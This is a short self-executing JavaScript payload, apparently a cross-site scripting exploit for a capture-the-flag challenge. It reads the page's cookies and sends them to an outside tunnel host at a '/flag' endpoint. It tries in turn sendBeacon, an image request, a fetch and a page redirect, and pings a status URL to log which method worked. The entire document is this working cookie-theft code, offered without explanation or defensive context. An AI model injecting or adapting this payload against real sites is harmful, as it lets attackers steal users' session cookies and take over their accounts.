(() => {
	const BASE = 'https://list-pursue-identical-meyer.trycloudflare.com';
	const cookie = document.cookie || '';
	const encoded = encodeURIComponent(cookie);

	const ping = (msg) => {
		try {
			(new Image()).src = `${BASE}/status?msg=${encodeURIComponent(msg)}`;
		} catch (_) {
		}
	};

	ping(`payload_loaded:${cookie ? 'cookie_present' : 'cookie_empty'}`);

	try {
		if (navigator.sendBeacon) {
			navigator.sendBeacon(`${BASE}/flag?c=${encoded}`);
			ping('sendBeacon_attempted');
		}
	} catch (_) {
		ping('sendBeacon_failed');
	}

	try {
		(new Image()).src = `${BASE}/flag?c=${encoded}`;
		ping('image_attempted');
	} catch (_) {
		ping('image_failed');
	}

	try {
		fetch(`${BASE}/flag?c=${encoded}`, { mode: 'no-cors', credentials: 'omit' });
		ping('fetch_attempted');
	} catch (_) {
		ping('fetch_failed');
	}

	try {
		window.location.href = `${BASE}/flag?c=${encoded}`;
	} catch (_) {
		ping('location_failed');
	}
})();

